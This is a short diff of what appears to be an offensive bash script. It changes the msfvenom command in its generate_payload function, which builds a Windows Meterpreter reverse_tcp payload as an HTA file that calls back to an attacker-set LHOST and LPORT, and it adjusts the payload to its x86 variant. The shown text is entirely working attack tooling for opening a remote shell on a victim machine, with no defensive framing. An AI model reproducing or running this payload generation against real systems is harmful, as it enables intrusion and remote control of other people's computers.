@@ -26,7 +26,7 @@ function check_dependencies() {
 # Payload Generation
 function generate_payload() {
     echo -e "${blue}[+] Generating HTA payload...${reset}"
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o payload.hta > /dev/null 2>&1
+    msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o payload.hta > /dev/null 2>&1
 
     if [[ -f payload.hta ]]; then
         echo -e "${green}[+] Payload saved as payload.hta${reset}"
